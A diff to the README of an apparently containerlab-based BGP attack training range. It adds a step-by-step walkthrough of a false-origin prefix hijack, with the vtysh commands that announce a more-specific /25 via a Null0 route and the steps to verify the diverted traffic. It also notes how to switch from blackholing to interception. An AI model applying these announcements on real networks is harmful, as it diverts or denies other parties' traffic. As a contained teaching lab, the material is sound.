@@ -17,8 +17,10 @@ attacker AS and a gamemaster collector) plus two host containers, and the first
 scenario (false-origin prefix hijack). The registry plane (RPKI/IRR) and an IXP
 route server are documented in `docs/design.md` as the next zones, not yet built.
 
-The configs in `configs/` are a first draft and have not yet been validated with
-a live `./ctl up` on a containerlab host. Treat the first deploy as the test.
+The core deploys cleanly and has been validated on containerlab 0.75: BGP
+converges, the gamemaster receives both tables while announcing nothing, and the
+first scenario diverts live traffic. The registry plane and IXP are still notes,
+not containers.
 
 ## Layout
 
@@ -46,11 +48,73 @@ Linux only, Docker's fixed-IP bridge networking needs a real Linux host, not Doc
 ## Quickstart
 
 ```bash
-./ctl up           # deploy the lab (prompts sudo for host bridges)
-./ctl table        # show the global table as the gamemaster sees it
-./ctl ssh attacker-as   # drop into the attacker foothold
-./ctl down         # tear it down
+./ctl up                # deploy the lab (prompts sudo for host bridges)
+./ctl table             # the global table as the gamemaster sees it
+./ctl lg                # same, as JSON for tooling
+./ctl vtysh attacker-as # drive BGP in the attacker foothold
+./ctl ssh attacker-as   # a plain shell on any node instead
+./ctl down              # tear it down
 ```
+
+## Walking the first scenario: false-origin hijack
+
+The attacker AS boots clean. Launching the hijack is your job, which is the
+point of a free-roam range: the table only lies once you make it.
+
+1. Look at the baseline from the collector. The victim's /24 is there, originated
+   by AS65010, and there is no more-specific yet:
+
+   ```bash
+   ./ctl table
+   ```
+
+2. Drop into the foothold and announce a more-specific of the victim's prefix.
+   The /25 is not connected on your router, so a discard route puts it in the RIB
+   for BGP to advertise:
+
+   ```bash
+   ./ctl vtysh attacker-as
+   ```
+   ```
+   configure terminal
+    ip route 203.0.113.0/25 Null0
+    router bgp 65020
+     address-family ipv4 unicast
+      network 203.0.113.0/25
+   end
+   ```
+
+3. Watch it propagate. The collector now lists the /25 with your AS (65020) as
+   origin, and even transit-a, the victim's own upstream, prefers it over the
+   legitimate /24 by longest-prefix match:
+
+   ```bash
+   ./ctl lg                                                    # 203.0.113.0/25, path ...65020
+   docker exec clab-inter-domain-transit-a vtysh -c 'show ip bgp'
+   ```
+
+4. See the traffic bend. Everything for 203.0.113.0 to .127 now heads to you
+   rather than the victim:
+
+   ```bash
+   docker exec -it clab-inter-domain-eyeball traceroute -n 203.0.113.10
+   ```
+
+   The path turns toward transit-b and the attacker. With the Null0 route in place
+   the packets stop there, so this run both diverts and denies the victim's
+   service. Swap the discard for a real next hop to forward and intercept instead.
+
+Reset when you are done, either by withdrawing the route or by recycling the lab:
+
+```bash
+./ctl vtysh attacker-as     # configure terminal, then under router bgp 65020:
+                            #   no network 203.0.113.0/25
+                            # then at top level: no ip route 203.0.113.0/25 Null0
+./ctl down && ./ctl up      # or just take the clean table back
+```
+
+The full briefing and reference solution live in
+`scenarios/false-origin-prefix-hijack/`.
 
 ## The topology (milestone 1)
 
@@ -74,5 +138,4 @@ is what the attacks exploit.
 
 ## See also
 
-- `PLAN.md` for the full build plan, multi-zone design, what is reusable from red-lantern-sim, and the open design questions.
 - `scenarios/` for the techniques drawn from Operation Red Lantern.
